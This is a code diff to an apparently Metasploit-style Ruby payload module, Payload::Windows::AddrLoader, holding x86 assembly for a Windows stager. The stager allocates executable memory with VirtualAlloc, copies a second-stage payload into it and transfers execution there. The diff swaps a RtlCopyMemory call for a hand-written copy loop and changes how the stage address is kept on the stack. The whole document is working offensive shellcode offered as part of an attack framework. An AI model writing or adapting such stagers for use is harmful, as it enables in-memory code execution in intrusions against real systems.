@@ -49,7 +49,10 @@ module Payload::Windows::AddrLoader
         push 0                  ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc( NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-        mov ebx, eax
+
+        xchg eax, ebx          ; place the allocated base address in ebx
+        push ebx               ; store a copy of the stage base address on the stack
+        push ebx               ; temporary storage for bytes read count
 
         call after_addr         ; Call after_addr, this pushes the address onto the stack.
         db 0x42, 0x42, 0x42, 0x42
@@ -57,16 +60,19 @@ module Payload::Windows::AddrLoader
         pop edi                 ; EDI = addr
         mov edi, [edi]
 
-        push esi                ; length
-        push edi                ; the address to load from
-        push eax                ; the rwx region
-        push #{Rex::Text.block_api_hash('ntdll.dll', 'RtlCopyMemory')}
-        call ebp                ; RtlCopyMemory(allocbuffer, buffer, length);
+      copy_memory:
+        mov edx, [edi]
+        mov [ebx], edx
+        add ebx, 4
+        add edi, 4
+        sub esi, 4
+        test esi,esi
+        jnz copy_memory
+        pop eax                ; clear the temporary storage
 
-        push ebx
-        mov eax, [0x4141]
+      execute_stage:
+        ret                    ; dive into the stored stage address
 
-        ret
     ^
     asm
   end
